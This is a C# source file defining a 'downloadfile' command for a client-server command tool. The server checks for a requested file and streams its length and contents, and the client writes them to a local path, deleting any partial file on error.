using System;
using System.Collections.Generic;
using System.IO;
using NetworkManager;
using Shared;

namespace Commands
{
    internal class DownloadFile : ICommand
    {
        public string name { get; } = "downloadfile";

        public string description { get; } = "Download a file from the server";

        public string syntaxHelper { get; } = "downloadfile [remoteFileName] [localFileName]";

        public bool isLocal { get; } = false;

        public List<List<Type>> validArguments { get; } = new List<List<Type>>()
        {
            new List<Type>()
            {
                typeof(string), typeof(string)
            }
        };

        public List<string> clientFlags { get; } = new List<string>()
        {
            "{DownloadFile:init}"
        };

        public List<string> savedData { get; set; } = new List<string>();


        public CommandsManager.PreProcessResult PreProcessCommand(List<string> args)
        {
            savedData.AddRange(args);
            return CommandsManager.PreProcessResult.OK;
        }

        public void ClientMethod(List<string> args)
        {
            var initResult = GlobalNetworkManager.ReadLine();
            if (initResult != "OK")
            {
                ColorTools.WriteCommandError(initResult == "NotFound" ? "The remote file doesn't exist" : "An IO exception occured");
                return;
            }

            var path = savedData[1];
            ColorTools.WriteCommandMessage($"Starting download of file '{savedData[0]}' from the server");
            
            var dataLength = int.Parse(GlobalNetworkManager.ReadLine());

            try
            {
                using (var fs = new FileStream(path, FileMode.Create))
                {
                    GlobalNetworkManager.ReadNetworkStreamAndWriteToStream(fs, 4096, dataLength);
                }

                ColorTools.WriteCommandSuccess("File successfully downloaded from the server");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(path);
                ColorTools.WriteCommandError("An error occured");
            }
        }

        public void ServerMethod(List<string> args)
        {
            GlobalNetworkManager.WriteLine(clientFlags[0]);

            if (!File.Exists(args[0]))
            {
                GlobalNetworkManager.WriteLine("NotFound");
                return;
            }

            try
            {
                using (var readStream = new FileStream(args[0], FileMode.Open))
                {
                    GlobalNetworkManager.WriteLine("OK");

                    // Send the data length first
                    GlobalNetworkManager.WriteLine(new FileInfo(args[0]).Length.ToString());
                    GlobalNetworkManager.ReadStreamAndWriteToNetworkStream(readStream, 4096);
                }
            }
            catch (IOException)
            {
                GlobalNetworkManager.WriteLine("IOException");
            }
        }
    }
}
